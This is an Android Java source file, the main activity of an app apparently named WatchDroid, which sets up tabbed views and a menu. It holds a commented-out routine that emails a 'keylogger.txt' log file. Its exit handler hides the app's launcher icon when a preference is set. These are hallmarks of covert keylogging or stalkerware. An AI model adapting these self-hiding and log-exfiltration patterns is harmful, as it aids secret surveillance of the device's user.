package com.watchdroid;

import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.support.design.widget.TabLayout;
import android.support.v4.app.Fragment;
import android.support.v4.view.ViewPager;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.support.v7.widget.Toolbar;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;
import com.arx_era.watchdroid.R;

import java.io.File;
import java.util.Random;

public class MainActivity extends AppCompatActivity implements ViewPager.OnPageChangeListener {

    private Toolbar toolbar;
    private TabLayout tabLayout;
    private ViewPager viewPager;
    ViewPagerAdapter mAdapterViewPager;
    Context context=this;
    SharedPreferences pref;
    private static final Random random = new Random();
    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        pref = getSharedPreferences(
                "Pref",
                Context.MODE_PRIVATE);

        toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        viewPager = (ViewPager) findViewById(R.id.viewpager);
        setupViewPager(viewPager);

        tabLayout = (TabLayout) findViewById(R.id.tabs);
        tabLayout.setupWithViewPager(viewPager);

    }

    private void setupViewPager(ViewPager viewPager) {
        mAdapterViewPager = new ViewPagerAdapter(getSupportFragmentManager());
        viewPager.setAdapter(mAdapterViewPager);
        viewPager.addOnPageChangeListener(this);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.toolbar, menu);//Menu Resource, Menu
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.loved:
                String[] toastMessages = new String[]{"Thank You", "We appreciate your love", "Please live a like"};
                int randomMsgIndex = random.nextInt(toastMessages.length - 1);
                Toast.makeText(getApplicationContext(), toastMessages[randomMsgIndex], Toast.LENGTH_SHORT).show();
                break;
            case R.id.mail:

                /*LayoutInflater li = LayoutInflater.from(context);
                View promptsView = li.inflate(R.layout.sent_mail, null);

                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
                        context);

                // set prompts.xml to alertdialog builder
                alertDialogBuilder.setView(promptsView);

                final EditText stremail = (EditText) promptsView
                        .findViewById(R.id.emailid);

                alertDialogBuilder
                        .setCancelable(false)
                        .setPositiveButton("Send Mail",
                                new DialogInterface.OnClickListener() {
                                    public void onClick(DialogInterface dialog,int id) {
                                        String email=stremail.getText().toString();
                                        Intent emailIntent = new Intent(android.content.Intent.ACTION_SEND);
                                        emailIntent.setType("text/html");
                                        emailIntent.putExtra(Intent.EXTRA_EMAIL  , new String[]{ email});
                                        emailIntent.putExtra(Intent.EXTRA_SUBJECT, "Log file from WatchDroid");
                                        emailIntent.putExtra(Intent.EXTRA_TEXT   , "Log file");
                                        emailIntent.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(new File("/sdcard/Android/data/arx_era/keylogger.txt")));
                                        emailIntent.setType("text/plain");

                                        startActivity(emailIntent);
                                    }
                                }).create().show();*/
                break;
        }
        return super.onOptionsItemSelected(item);
    }

    @Override
    public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels) {

    }

    @Override
    public void onPageSelected(int position) {
        Fragment fragment = mAdapterViewPager.getFragment(position);
        if (fragment != null) {
            fragment.onResume();
        }
    }

    @Override
    public void onPageScrollStateChanged(int state) {

    }

    @Override
    public void onBackPressed() {
        new AlertDialog.Builder(this)
                .setTitle("Exit")
                .setMessage("Are you sure you want exit?")
                .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        final Boolean keyhideicon = pref.getBoolean("keyhideicon", Boolean.parseBoolean(null));
                        if(keyhideicon){
                            PackageManager p = getPackageManager();
                            ComponentName componentName = new ComponentName(MainActivity.this, com.watchdroid.SplashScreen.class);
                            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                            Toast.makeText(MainActivity.this, "App will be hidden after some delay", Toast.LENGTH_SHORT).show();
                        }
                        finish();
                    }

                })
                .setNegativeButton("No", null)
                .show();
    }
}
